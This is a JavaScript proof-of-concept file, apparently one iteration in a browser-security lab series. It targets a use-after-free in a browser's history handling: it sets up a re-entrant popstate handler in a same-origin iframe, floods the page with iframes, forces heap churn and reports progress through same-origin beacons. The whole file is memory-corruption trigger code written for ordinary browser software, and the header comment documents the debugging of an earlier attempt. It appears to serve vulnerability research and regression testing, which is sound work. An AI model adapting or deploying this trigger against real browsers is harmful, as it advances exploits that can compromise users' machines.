// c025c: HistoryController UAF via re-entrant popstate (fix efe49205) - same-origin child frame.
//
// c025b reached the code but pushState threw SecurityError: an about:blank frame has an opaque origin, so its
// history is not scriptable. The child now loads a real same-origin document from the lab.
(function () {
  function send(t) { try { navigator.sendBeacon('/beacon', 'c025c-' + t); } catch (e) {} }
  send('boot');

  function churn() {
    if (typeof GCController !== 'undefined') { GCController.collect(); return; }
    for (var i = 0; i < 6000; i++) { var s = new String('A'.repeat(4000)); }
  }

  var f = document.createElement('iframe');
  f.style.display = 'none';
  f.onload = function () {
    send('loaded');
    var w = f.contentWindow;
    try {
      w.addEventListener('popstate', function () {
        for (var i = 0; i < 40; i++) {
          var g = document.createElement('iframe');
          g.src = '/cases/blank.html';
          document.body.appendChild(g);
        }
        churn();
        send('popstate-ran');
      }, { once: true });

      w.history.pushState({ k: 1 }, '', '#x');
      send('pushed');
      setTimeout(function () {
        try { w.history.back(); send('back-called'); }
        catch (e) { send('back-threw:' + e.name); }
      }, 50);
    } catch (e) { send('setup-threw:' + e.name); }
  };
  f.src = '/cases/blank.html';
  document.body.appendChild(f);
  send('iframe-added');

  setTimeout(function () { send('survived'); }, 3000);
})();
